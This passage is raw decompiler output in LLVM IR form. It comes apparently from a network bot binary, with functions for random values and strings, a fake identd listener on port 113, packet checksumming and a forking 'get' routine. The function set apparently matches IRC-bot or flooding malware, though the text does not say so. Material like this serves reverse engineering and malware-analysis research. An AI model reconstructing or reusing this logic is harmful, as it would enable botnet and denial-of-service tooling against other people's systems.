entry:
  %v0_8048469 = load i8*, i8** @global_var_8074074.33, align 4
  %v1_8048469 = ptrtoint i8* %v0_8048469 to i32
  %v2_804846e = icmp eq i8* %v0_8048469, null
  %v1_8048470 = icmp eq i1 %v2_804846e, false
  br i1 %v1_8048470, label %dec_label_pc_804847c, label %dec_label_pc_8048472

dec_label_pc_8048472:                             ; preds = %entry
  %v0_8048472 = call i32 @random()
  br label %dec_label_pc_80484cd

dec_label_pc_804847c:                             ; preds = %entry
  %v0_804847c = load i64, i64* @global_var_8074078.34, align 8
  %v1_804847c = trunc i64 %v0_804847c to i32
  %v9_8048481 = icmp eq i32 %v1_804847c, 1
  %v1_8048484 = icmp eq i1 %v9_8048481, false
  br i1 %v1_8048484, label %dec_label_pc_804849c, label %dec_label_pc_8048486

dec_label_pc_8048486:                             ; preds = %dec_label_pc_804847c
  %v2_804848f = call i32 @ntohl(i32 %v1_8048469)
  br label %dec_label_pc_80484cd

dec_label_pc_804849c:                             ; preds = %dec_label_pc_804847c
  %v0_804849c = call i32 @random()
  %v0_80484a3 = load i64, i64* @global_var_8074078.34, align 8
  %sext = mul i64 %v0_80484a3, 4294967296
  %v5_80484a8 = sdiv i64 %sext, 4294967296
  %v6_80484b2 = zext i32 %v0_804849c to i64
  %v14_80484b2 = urem i64 %v6_80484b2, %v5_80484a8
  %v15_80484b2 = trunc i64 %v14_80484b2 to i32
  %v0_80484b5 = load i8*, i8** @global_var_8074074.33, align 4
  %v1_80484b5 = ptrtoint i8* %v0_80484b5 to i32
  %v2_80484ba = add i32 %v15_80484b2, 1
  %v1_80484bd = add i32 %v2_80484ba, %v1_80484b5
  %v2_80484c2 = call i32 @ntohl(i32 %v1_80484bd)
  br label %dec_label_pc_80484cd

dec_label_pc_80484cd:                             ; preds = %dec_label_pc_8048486, %dec_label_pc_8048472, %dec_label_pc_804849c
  %stack_var_-8.0 = phi i32 [ %v2_80484c2, %dec_label_pc_804849c ], [ %v2_804848f, %dec_label_pc_8048486 ], [ %v0_8048472, %dec_label_pc_8048472 ]
  ret i32 %stack_var_-8.0

; uselistorder directives
  uselistorder label %dec_label_pc_80484cd, { 2, 0, 1 }
}

define i32 @filter() local_unnamed_addr {
entry:
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v4_8048508 = inttoptr i32 %tmp2 to i8*
  br label %dec_label_pc_80484fa

dec_label_pc_80484db:                             ; preds = %dec_label_pc_804851c, %dec_label_pc_80484fa
  %v3_80484ec = call i32 @_strlen(i8* %v4_8048508)
  %v5_80484f3 = add i32 %tmp2, %v3_80484ec
  %v1_80484f6 = add i32 %v5_80484f3, -1
  %v1_80484f7 = inttoptr i32 %v1_80484f6 to i8*
  store i8 0, i8* %v1_80484f7, align 1
  br label %dec_label_pc_80484fa

dec_label_pc_80484fa:                             ; preds = %entry, %dec_label_pc_80484db
  %v3_804850b = call i32 @_strlen(i8* %v4_8048508)
  %v5_8048512 = add i32 %tmp2, %v3_804850b
  %v1_8048515 = add i32 %v5_8048512, -1
  %v1_8048516 = inttoptr i32 %v1_8048515 to i8*
  %v2_8048516 = load i8, i8* %v1_8048516, align 1
  %v10_8048518 = icmp eq i8 %v2_8048516, 13
  br i1 %v10_8048518, label %dec_label_pc_80484db, label %dec_label_pc_804851c

dec_label_pc_804851c:                             ; preds = %dec_label_pc_80484fa
  %v3_804852d = call i32 @_strlen(i8* %v4_8048508)
  %v5_8048534 = add i32 %tmp2, %v3_804852d
  %v1_8048537 = add i32 %v5_8048534, -1
  %v1_8048538 = inttoptr i32 %v1_8048537 to i8*
  %v2_8048538 = load i8, i8* %v1_8048538, align 1
  %v11_804853a = icmp eq i8 %v2_8048538, 10
  br i1 %v11_804853a, label %dec_label_pc_80484db, label %dec_label_pc_804853e

dec_label_pc_804853e:                             ; preds = %dec_label_pc_804851c
  %v1_8048543 = sext i8 %v2_8048538 to i32
  ret i32 %v1_8048543

; uselistorder directives
  uselistorder i8* %v4_8048508, { 0, 2, 1 }
  uselistorder i32 %tmp2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_80484fa, { 1, 0 }
}

define i32 @randstring(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i8*, align 4
  %v2_804854f = call i32 @__GI_time(i32* null)
  %v1_804855b = call i32 @srand(i32 %v2_804854f)
  %v4_8048571 = ptrtoint i8* %arg1 to i32
  %v1_8048574 = add i32 %v4_8048571, 1
  %v1_8048579 = call i32 @malloc(i32 %v1_8048574)
  %tmp17 = bitcast i8** %stack_var_-16 to i32*
  store i32 %v1_8048579, i32* %tmp17, align 4
  %v5_8048584 = icmp eq i32 %v1_8048579, 0
  %v1_8048588 = icmp eq i1 %v5_8048584, false
  %tmp27 = inttoptr i32 %v1_8048579 to i8*
  br i1 %v1_8048588, label %dec_label_pc_80485c8.preheader, label %dec_label_pc_80485df

dec_label_pc_80485c8.preheader:                   ; preds = %entry
  %v7_80485ce23 = icmp sgt i8* %arg1, null
  br i1 %v7_80485ce23, label %dec_label_pc_80485a3, label %dec_label_pc_80485d0

dec_label_pc_80485a3:                             ; preds = %dec_label_pc_80485a3, %dec_label_pc_80485c8.preheader
  %v4_80485b8 = phi i8* [ %tmp27, %dec_label_pc_80485c8.preheader ], [ %v4_80485b8.pre, %dec_label_pc_80485a3 ]
  %storemerge524 = phi i32 [ 0, %dec_label_pc_80485c8.preheader ], [ %v4_80485c5, %dec_label_pc_80485a3 ]
  %v0_80485a3 = call i32 @random()
  %v1_80485a3 = sext i32 %v0_80485a3 to i64
  %v15_80485ad = urem i64 %v1_80485a3, 62
  %v16_80485ad = trunc i64 %v15_80485ad to i32
  %v5_80485b8 = ptrtoint i8* %v4_80485b8 to i32
  %v6_80485b8 = add i32 %v5_80485b8, %storemerge524
  %v6_80485be = add i32 %v16_80485ad, ptrtoint ([63 x i8]* @global_var_8068b14.35 to i32)
  %v1_80485c1 = inttoptr i32 %v6_80485be to i8*
  %v2_80485c1 = load i8, i8* %v1_80485c1, align 1
  %v3_80485c3 = inttoptr i32 %v6_80485b8 to i8*
  store i8 %v2_80485c1, i8* %v3_80485c3, align 1
  %v4_80485c5 = add i32 %storemerge524, 1
  %v6_80485cb = inttoptr i32 %v4_80485c5 to i8*
  %v7_80485ce = icmp slt i8* %v6_80485cb, %arg1
  %v4_80485b8.pre = load i8*, i8** %stack_var_-16, align 4
  br i1 %v7_80485ce, label %dec_label_pc_80485a3, label %dec_label_pc_80485d0

dec_label_pc_80485d0:                             ; preds = %dec_label_pc_80485a3, %dec_label_pc_80485c8.preheader
  %v4_80485d3 = phi i8* [ %tmp27, %dec_label_pc_80485c8.preheader ], [ %v4_80485b8.pre, %dec_label_pc_80485a3 ]
  %v5_80485d3 = ptrtoint i8* %v4_80485d3 to i32
  %v6_80485d3 = add i32 %v5_80485d3, %v4_8048571
  %v1_80485d6 = inttoptr i32 %v6_80485d3 to i8*
  store i8 0, i8* %v1_80485d6, align 1
  %v3_80485d9 = load i8*, i8** %stack_var_-16, align 4
  %v4_80485d9 = ptrtoint i8* %v3_80485d9 to i32
  br label %dec_label_pc_80485df

dec_label_pc_80485df:                             ; preds = %entry, %dec_label_pc_80485d0
  %storemerge = phi i32 [ %v4_80485d9, %dec_label_pc_80485d0 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80485c5, { 1, 0 }
  uselistorder i32 %v1_8048579, { 0, 2, 1 }
  uselistorder i8** %stack_var_-16, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80485df, { 1, 0 }
}

define i32 @identd() local_unnamed_addr {
entry:
  %stack_var_-1092 = alloca i32, align 4
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1228 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1260 = alloca i32, align 4
  store i32 2, i32* %stack_var_-1260, align 4
  %v3_80485f7 = call i32 @socket(i32 2, i32 1, i32 0)
  %v13_8048602 = icmp eq i32 %v3_80485f7, -1
  br i1 %v13_8048602, label %dec_label_pc_8048821, label %dec_label_pc_804860c

dec_label_pc_804860c:                             ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  store i32 113, i32* %stack_var_-1260, align 4
  %v1_8048617 = call i32 @htons(i32 113)
  %v2_804862a = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v3_80485f7, i32* %stack_var_-1260, align 4
  %v3_8048649 = call i32 @bind(i32 %v3_80485f7, i32 %v2_804862a, i32 16)
  %v10_8048651 = icmp eq i32 %v3_8048649, -1
  br i1 %v10_8048651, label %dec_label_pc_8048821, label %dec_label_pc_804865a

dec_label_pc_804865a:                             ; preds = %dec_label_pc_804860c
  store i32 %v3_80485f7, i32* %stack_var_-1260, align 4
  %v2_8048662 = call i32 @listen(i32 %v3_80485f7, i32 1)
  %v10_804866a = icmp eq i32 %v2_8048662, -1
  br i1 %v10_804866a, label %dec_label_pc_8048821, label %dec_label_pc_8048673

dec_label_pc_8048673:                             ; preds = %dec_label_pc_804865a
  %v0_8048673 = load i32, i32* %stack_var_-1260, align 4
  %v1_8048673 = call i32 @fork(i32 %v0_8048673)
  %v1_8048678 = icmp eq i32 %v1_8048673, 0
  br i1 %v1_8048678, label %dec_label_pc_8048821, label %dec_label_pc_8048680

dec_label_pc_8048680:                             ; preds = %dec_label_pc_8048673
  store i32 16, i32* %stack_var_-36, align 4
  %v2_8048687 = ptrtoint i32* %stack_var_-36 to i32
  %v2_804868a = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v3_80485f7, i32* %stack_var_-1260, align 4
  %v3_8048695 = call i32 @accept(i32 %v3_80485f7, i32 %v2_804868a, i32 %v2_8048687)
  %v4_80486a0 = add i32 %v3_8048695, 1
  %v13_80486a0 = icmp eq i32 %v4_80486a0, 0
  %v1_80486a4 = icmp eq i1 %v13_80486a0, false
  br i1 %v1_80486a4, label %dec_label_pc_80486b0.preheader, label %dec_label_pc_80486a6

dec_label_pc_80486a6:                             ; preds = %dec_label_pc_8048680
  store i32 0, i32* %stack_var_-1260, align 4
  %v1_80486ab = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80486b0.preheader

dec_label_pc_80486b0.preheader:                   ; preds = %dec_label_pc_80486a6, %dec_label_pc_8048680
  %v2_80486ba = ptrtoint i32* %stack_var_-1228 to i32
  %tmp33 = bitcast i32* %stack_var_-1228 to i8*
  %v2_80486ce = udiv i32 %v3_8048695, 32
  %v1_80486d4 = urem i32 %v3_8048695, 32
  %v9_80486d7 = shl i32 1, %v1_80486d4
  %v2_80486fc = ptrtoint i32* %stack_var_-1100 to i32
  %v2_8048733 = mul nuw nsw i32 %v2_80486ce, 4
  %v3_8048733 = add nsw i32 %v2_8048733, -1224
  br label %dec_label_pc_80486b0

dec_label_pc_80486b0:                             ; preds = %dec_label_pc_80486b0.preheader, %dec_label_pc_8048725
  store i32 %v2_80486ba, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80486c1 = call i8* @_memset(i8* %tmp33, i32 0, i32 32)
  %v0_80486d7 = load i32, i32* @ebp, align 4
  %v4_80486d7 = add i32 %v3_8048733, %v0_80486d7
  %v5_80486d7 = inttoptr i32 %v4_80486d7 to i32*
  %v6_80486d7 = load i32, i32* %v5_80486d7, align 4
  %v12_80486d7 = or i32 %v6_80486d7, %v9_80486d7
  store i32 %v12_80486d7, i32* %v5_80486d7, align 4
  store i32 60, i32* %stack_var_-1100, align 4
  %v6_804870f = call i32 @__libc_select(i32 %v4_80486a0, i32 %v2_80486ba, i32 0, i32 0, i32 %v2_80486fc)
  %v2_8048717 = icmp slt i32 %v6_804870f, 0
  %v1_8048719 = icmp eq i1 %v2_8048717, false
  br i1 %v1_8048719, label %dec_label_pc_8048725, label %dec_label_pc_804871b

dec_label_pc_804871b:                             ; preds = %dec_label_pc_80486b0
  %v1_8048720 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048725

dec_label_pc_8048725:                             ; preds = %dec_label_pc_80486b0, %dec_label_pc_804871b
  %v0_8048733 = load i32, i32* @ebp, align 4
  %v4_8048733 = add i32 %v3_8048733, %v0_8048733
  %v5_8048733 = inttoptr i32 %v4_8048733 to i32*
  %v6_8048733 = load i32, i32* %v5_8048733, align 4
  %v10_8048733 = and i32 %v6_8048733, %v9_80486d7
  %v11_8048733 = icmp ne i32 %v10_8048733, 0
  %v4_804873e = icmp eq i1 %v11_8048733, false
  %v1_8048740 = icmp eq i1 %v4_804873e, false
  br i1 %v1_8048740, label %dec_label_pc_8048747, label %dec_label_pc_80486b0

dec_label_pc_8048747:                             ; preds = %dec_label_pc_8048725
  %v2_804874e = ptrtoint i32* %stack_var_-1092 to i32
  %v5_8048758 = call i32 @recv(i32 %v3_8048695, i32 %v2_804874e, i32 1024, i32 0)
  %tmp34 = icmp slt i32 %v5_8048758, 1
  br i1 %tmp34, label %dec_label_pc_804876f, label %dec_label_pc_8048769

dec_label_pc_8048769:                             ; preds = %dec_label_pc_8048747
  %v7_804876d = icmp sgt i32 %v5_8048758, 19
  br i1 %v7_804876d, label %dec_label_pc_804876f, label %dec_label_pc_8048779

dec_label_pc_804876f:                             ; preds = %dec_label_pc_8048769, %dec_label_pc_8048747
  %v1_8048774 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048779

dec_label_pc_8048779:                             ; preds = %dec_label_pc_8048769, %dec_label_pc_804876f
  %v0_804877c = load i32, i32* @ebp, align 4
  %v2_804877c = add i32 %v5_8048758, -1088
  %v3_804877c = add i32 %v2_804877c, %v0_804877c
  %v4_804877c = inttoptr i32 %v3_804877c to i8*
  store i8 0, i8* %v4_804877c, align 1
  %v0_8048788 = load i32, i32* @ebp, align 4
  %v2_8048788 = add i32 %v5_8048758, -1089
  %v3_8048788 = add i32 %v2_8048788, %v0_8048788
  %v4_8048788 = inttoptr i32 %v3_8048788 to i8*
  %v5_8048788 = load i8, i8* %v4_8048788, align 1
  %v10_804878f = icmp eq i8 %v5_8048788, 10
  br i1 %v10_804878f, label %dec_label_pc_80487a2, label %dec_label_pc_8048793

dec_label_pc_8048793:                             ; preds = %dec_label_pc_8048779
  %v5_8048797 = load i8, i8* %v4_8048788, align 1
  %v10_804879e = icmp eq i8 %v5_8048797, 13
  %v1_80487a0 = icmp eq i1 %v10_804879e, false
  br i1 %v1_80487a0, label %dec_label_pc_80487ae, label %dec_label_pc_80487a2

dec_label_pc_80487a2:                             ; preds = %dec_label_pc_8048793, %dec_label_pc_8048779
  store i8 0, i8* %v4_8048788, align 1
  %v0_80487b4.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80487ae

dec_label_pc_80487ae:                             ; preds = %dec_label_pc_8048793, %dec_label_pc_80487a2
  %v0_80487d6 = phi i32 [ %v0_8048788, %dec_label_pc_8048793 ], [ %v0_80487b4.pre, %dec_label_pc_80487a2 ]
  %v2_80487b4 = add i32 %v5_8048758, -1090
  %v3_80487b4 = add i32 %v2_80487b4, %v0_80487d6
  %v4_80487b4 = inttoptr i32 %v3_80487b4 to i8*
  %v5_80487b4 = load i8, i8* %v4_80487b4, align 1
  %v10_80487bb = icmp eq i8 %v5_80487b4, 10
  br i1 %v10_80487bb, label %dec_label_pc_80487d0, label %dec_label_pc_80487bf

dec_label_pc_80487bf:                             ; preds = %dec_label_pc_80487ae
  %v5_80487c5 = load i8, i8* %v4_80487b4, align 1
  %v10_80487cc = icmp eq i8 %v5_80487c5, 13
  %v1_80487ce = icmp eq i1 %v10_80487cc, false
  br i1 %v1_80487ce, label %dec_label_pc_80487de, label %dec_label_pc_80487d0

dec_label_pc_80487d0:                             ; preds = %dec_label_pc_80487bf, %dec_label_pc_80487ae
  store i8 0, i8* %v4_80487b4, align 1
  br label %dec_label_pc_80487de

dec_label_pc_80487de:                             ; preds = %dec_label_pc_80487bf, %dec_label_pc_80487d0
  %v3_80487f3 = call i32 @Send(i32 %v3_8048695, i32 ptrtoint ([25 x i8]* @global_var_8068b53.37 to i32))
  %v1_8048801 = call i32 @close(i32 %v3_8048695)
  %v1_804880f = call i32 @close(i32 %v3_80485f7)
  %v1_804881c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048821

dec_label_pc_8048821:                             ; preds = %dec_label_pc_8048673, %dec_label_pc_804865a, %dec_label_pc_804860c, %entry, %dec_label_pc_80487de
  %v0_8048825 = phi i32 [ 0, %dec_label_pc_8048673 ], [ %v2_8048662, %dec_label_pc_804865a ], [ %v3_8048649, %dec_label_pc_804860c ], [ %v3_80485f7, %entry ], [ %v1_804881c, %dec_label_pc_80487de ]
  ret i32 %v0_8048825

; uselistorder directives
  uselistorder i32 %v5_8048758, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v3_8048733, { 1, 0 }
  uselistorder i32 %v3_8048695, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32 %v2_8048662, { 1, 0 }
  uselistorder i32 %v3_8048649, { 1, 0 }
  uselistorder i32 %v3_80485f7, { 1, 8, 6, 7, 4, 5, 2, 3, 0 }
  uselistorder i32* %stack_var_-1260, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder label %dec_label_pc_8048821, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80487de, { 1, 0 }
  uselistorder label %dec_label_pc_80487ae, { 1, 0 }
  uselistorder label %dec_label_pc_8048779, { 1, 0 }
  uselistorder label %dec_label_pc_8048725, { 1, 0 }
  uselistorder label %dec_label_pc_80486b0, { 1, 0 }
}

define i32 @pow(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048826 = load i32, i32* @ebp, align 4
  store i32 %v0_8048826, i32* %stack_var_-4, align 4
  %v4_8048826 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048826, i32* @ebp, align 4
  %v4_804882c = icmp eq i32 %arg2, 0
  %v1_8048830 = icmp eq i1 %v4_804882c, false
  br i1 %v1_8048830, label %dec_label_pc_804883b, label %dec_label_pc_8048832

dec_label_pc_8048832:                             ; preds = %entry
  br label %dec_label_pc_8048865

dec_label_pc_804883b:                             ; preds = %entry
  %v4_804883b = add i32 %arg2, -1
  %v12_804883b = icmp eq i32 %v4_804883b, 0
  %v1_804883f = icmp eq i1 %v12_804883b, false
  br i1 %v1_804883f, label %dec_label_pc_8048849, label %dec_label_pc_8048841

dec_label_pc_8048841:                             ; preds = %dec_label_pc_804883b
  %v4_8048841 = trunc i64 %arg1 to i32
  br label %dec_label_pc_8048865

dec_label_pc_8048849:                             ; preds = %dec_label_pc_804883b
  %v4_8048854 = call i32 @pow(i64 %arg1, i32 %v4_804883b)
  %v6_804885e = sext i32 %v4_8048854 to i64
  %v8_804885e = mul nsw i64 %v6_804885e, %arg1
  %v9_804885e = trunc i64 %v8_804885e to i32
  br label %dec_label_pc_8048865

dec_label_pc_8048865:                             ; preds = %dec_label_pc_8048841, %dec_label_pc_8048832, %dec_label_pc_8048849
  %v3_8048865.off0 = phi i32 [ %v4_8048841, %dec_label_pc_8048841 ], [ 1, %dec_label_pc_8048832 ], [ %v9_804885e, %dec_label_pc_8048849 ]
  ret i32 %v3_8048865.off0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8048865, { 2, 0, 1 }
}

define i32 @in_cksum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804886a = load i32, i32* @ebp, align 4
  %v4_80488a124 = add i32 %arg2, -1
  %v9_80488a125 = sub i32 0, %arg2
  %v10_80488a126 = and i32 %arg2, %v9_80488a125
  %v11_80488a127 = icmp slt i32 %v10_80488a126, 0
  %v12_80488a128 = icmp eq i32 %v4_80488a124, 0
  %v13_80488a129 = icmp slt i32 %v4_80488a124, 0
  %v3_80488a530 = icmp eq i1 %v13_80488a129, %v11_80488a127
  %v4_80488a531 = icmp eq i1 %v12_80488a128, false
  %v5_80488a532 = and i1 %v4_80488a531, %v3_80488a530
  br i1 %v5_80488a532, label %dec_label_pc_804888b, label %dec_label_pc_80488a7

dec_label_pc_804888b:                             ; preds = %entry, %dec_label_pc_804888b
  %stack_var_-24.035 = phi i16 [ %v6_8048896, %dec_label_pc_804888b ], [ 0, %entry ]
  %stack_var_-28.034 = phi i16* [ %v23_8048899, %dec_label_pc_804888b ], [ %arg1, %entry ]
  %v3_804889d33 = phi i32 [ %v4_804889d, %dec_label_pc_804888b ], [ %arg2, %entry ]
  %v4_804888b = ptrtoint i16* %stack_var_-28.034 to i32
  %v2_804888e = load i16, i16* %stack_var_-28.034, align 2
  %v6_8048896 = add i16 %v2_804888e, %stack_var_-24.035
  %v5_8048899 = add i32 %v4_804888b, 2
  %v23_8048899 = inttoptr i32 %v5_8048899 to i16*
  %v4_804889d = add i32 %v3_804889d33, -2
  %v4_80488a1 = add i32 %v3_804889d33, -3
  %v9_80488a1 = sub i32 2, %v3_804889d33
  %v10_80488a1 = and i32 %v4_804889d, %v9_80488a1
  %v11_80488a1 = icmp slt i32 %v10_80488a1, 0
  %v12_80488a1 = icmp eq i32 %v4_80488a1, 0
  %v13_80488a1 = icmp slt i32 %v4_80488a1, 0
  %v3_80488a5 = icmp eq i1 %v13_80488a1, %v11_80488a1
  %v4_80488a5 = icmp eq i1 %v12_80488a1, false
  %v5_80488a5 = and i1 %v4_80488a5, %v3_80488a5
  br i1 %v5_80488a5, label %dec_label_pc_804888b, label %dec_label_pc_80488a7

dec_label_pc_80488a7:                             ; preds = %dec_label_pc_804888b, %entry
  %stack_var_-28.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_8048899, %dec_label_pc_804888b ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v6_8048896, %dec_label_pc_804888b ]
  %v4_80488a5.lcssa = phi i1 [ %v4_80488a531, %entry ], [ %v4_80488a5, %dec_label_pc_804888b ]
  br i1 %v4_80488a5.lcssa, label %dec_label_pc_80488c3, label %dec_label_pc_80488ad

dec_label_pc_80488ad:                             ; preds = %dec_label_pc_80488a7
  %v4_80488b0 = ptrtoint i16* %stack_var_-28.0.lcssa to i32
  %v1_80488b3 = bitcast i16* %stack_var_-28.0.lcssa to i8*
  %v2_80488b3 = load i8, i8* %v1_80488b3, align 1
  %v3_80488b3 = zext i8 %v2_80488b3 to i32
  %v5_80488b3 = and i32 %v4_80488b0, -256
  %v6_80488b3 = or i32 %v3_80488b3, %v5_80488b3
  %v4_80488b711 = urem i32 %v6_80488b3, 65536
  %v4_80488c044 = zext i16 %stack_var_-24.0.lcssa to i32
  %v6_80488c0 = add nuw nsw i32 %v4_80488b711, %v4_80488c044
  %v26_80488c0 = trunc i32 %v6_80488c0 to i16
  br label %dec_label_pc_80488c3

dec_label_pc_80488c3:                             ; preds = %dec_label_pc_80488a7, %dec_label_pc_80488ad
  %stack_var_-24.1 = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_80488a7 ], [ %v26_80488c0, %dec_label_pc_80488ad ]
  %v4_80488c3 = sext i16 %stack_var_-24.1 to i32
  %v2_80488c6 = sdiv i32 %v4_80488c3, 65536
  %v2_80488cd = add nsw i32 %v2_80488c6, %v4_80488c3
  %sext5 = mul i32 %v2_80488cd, 65536
  %v2_80488d5 = ashr i32 %sext5, 31
  %v6_80488d813 = mul nsw i32 %v2_80488d5, 65536
  %v4_80488d21214 = add i32 %v6_80488d813, %sext5
  %v4_80488db23 = udiv i32 %v4_80488d21214, 65536
  %v1_80488e8 = xor i32 %v4_80488db23, 65535
  store i32 %v0_804886a, i32* @ebp, align 4
  ret i32 %v1_80488e8

; uselistorder directives
  uselistorder i32 %sext5, { 1, 0 }
  uselistorder i32 %v4_80488c3, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v4_80488a1, { 1, 0 }
  uselistorder i32 %v4_804889d, { 1, 0 }
  uselistorder label %dec_label_pc_80488c3, { 1, 0 }
  uselistorder label %dec_label_pc_804888b, { 1, 0 }
}

define i32 @get(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-5192 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-5228 = alloca i32, align 4
  %v12_80488f4 = ptrtoint i32* %stack_var_-5228 to i32
  %v5_80488fa = icmp ult i32* %stack_var_-5228, inttoptr (i32 12 to i32*)
  store i1 %v5_80488fa, i1* %cf.global-to-local, align 1
  %v1_8048900 = call i32 @mfork(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048908 = icmp eq i32 %v1_8048900, 0
  %v1_804890a = icmp eq i1 %v1_8048908, false
  br i1 %v1_804890a, label %dec_label_pc_8048dc8, label %dec_label_pc_8048910

dec_label_pc_8048910:                             ; preds = %entry
  %v4_8048910 = add i32 %arg3, -1
  %v8_8048910 = icmp eq i32 %arg3, 0
  %v9_8048910 = sub i32 0, %arg3
  %v10_8048910 = and i32 %arg3, %v9_8048910
  %v11_8048910 = icmp slt i32 %v10_8048910, 0
  store i1 %v8_8048910, i1* %cf.global-to-local, align 1
  %v12_8048910 = icmp eq i32 %v4_8048910, 0
  %v13_8048910 = icmp slt i32 %v4_8048910, 0
  %v3_8048914 = icmp eq i1 %v13_8048910, %v11_8048910
  %v4_8048914 = icmp eq i1 %v12_8048910, false
  %v5_8048914 = and i1 %v4_8048914, %v3_8048914
  br i1 %v5_8048914, label %dec_label_pc_8048936, label %dec_label_pc_8048916

dec_label_pc_8048916:                             ; preds = %dec_label_pc_8048910
  %v5_8048916 = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_8048916, i1* %cf.global-to-local, align 1
  %v3_8048924 = call i32 @Send(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_8068b6c.38 to i32))
  store i1 %v5_80488fa, i1* %cf.global-to-local, align 1
  %v1_8048931 = call i32 @__GI_exit(i32 0)
  %v0_8048936.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048936

dec_label_pc_8048936:                             ; preds = %dec_label_pc_8048910, %dec_label_pc_8048916
  %v0_8048936 = phi i32 [ %v0_8048936.pre, %dec_label_pc_8048916 ], [ %v12_80488f4, %dec_label_pc_8048910 ]
  %v5_8048936 = icmp ult i32 %v0_8048936, 4
  store i1 %v5_8048936, i1* %cf.global-to-local, align 1
  %v4_804893f = call i32 @socket(i32 2, i32 1, i32 0)
  %v8_804894a = icmp ne i32 %v4_804893f, -1
  store i1 %v8_804894a, i1* %cf.global-to-local, align 1
  %v13_804894a = icmp eq i32 %v4_804893f, -1
  %v1_804894e = icmp eq i1 %v13_804894a, false
  br i1 %v1_804894e, label %dec_label_pc_8048970, label %dec_label_pc_8048950

dec_label_pc_8048950:                             ; preds = %dec_label_pc_8048936
  %v5_8048950 = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_8048950, i1* %cf.global-to-local, align 1
  %v3_804895e = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_8068b90.39 to i32))
  store i1 %v5_80488fa, i1* %cf.global-to-local, align 1
  %v1_804896b = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048970

dec_label_pc_8048970:                             ; preds = %dec_label_pc_8048936, %dec_label_pc_8048950
  %v1_8048973 = add i32 %arg4, 4
  %v5_8048973 = icmp ugt i32 %arg4, -5
  store i1 %v5_8048973, i1* %cf.global-to-local, align 1
  %v1_8048976 = inttoptr i32 %v1_8048973 to i32*
  %v2_8048976 = load i32, i32* %v1_8048976, align 4
  store i1 false, i1* @df, align 1
  %v4_8048993 = inttoptr i32 %v2_8048976 to i8*
  store i32 %v2_8048976, i32* @esi, align 4
  %v7_80489a5 = call i32 @_strncmp(i8* %v4_8048993, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068bb5.40, i32 0, i32 0), i32 7)
  %v8_80489a5 = urem i32 %v7_80489a5, 2
  %v9_80489a5 = icmp eq i32 %v8_80489a5, 0
  %v0_80489a7 = load i1, i1* %cf.global-to-local, align 1
  %v2_80489a7 = or i1 %v0_80489a7, %v9_80489a5
  %v3_80489a7 = zext i1 %v2_80489a7 to i32
  %v4_80489a7 = load i32, i32* @edx, align 4
  %v5_80489a7 = and i32 %v4_80489a7, -256
  %v6_80489a7 = or i32 %v3_80489a7, %v5_80489a7
  %v7_80489a7 = xor i32 %v6_80489a7, 1
  store i32 %v7_80489a7, i32* %edx.global-to-local, align 4
  %v1_80489af = trunc i32 %v7_80489a7 to i8
  %v3_80489af = zext i1 %v0_80489a7 to i8
  %v15_80489af = icmp eq i8 %v1_80489af, %v3_80489af
  %v1_80489b8 = icmp eq i1 %v15_80489af, false
  store i1 %v5_8048973, i1* %cf.global-to-local, align 1
  %v2_80489e0 = load i32, i32* %v1_8048976, align 4
  br i1 %v1_80489b8, label %dec_label_pc_80489da, label %dec_label_pc_80489ba

dec_label_pc_80489ba:                             ; preds = %dec_label_pc_8048970
  %v1_80489c2 = add i32 %v2_80489e0, 7
  %v0_80489c5 = load i32, i32* @esp, align 4
  %v5_80489c5 = icmp ult i32 %v0_80489c5, 8
  store i1 %v5_80489c5, i1* %cf.global-to-local, align 1
  %v2_80489c9 = ptrtoint i32* %stack_var_-1096 to i32
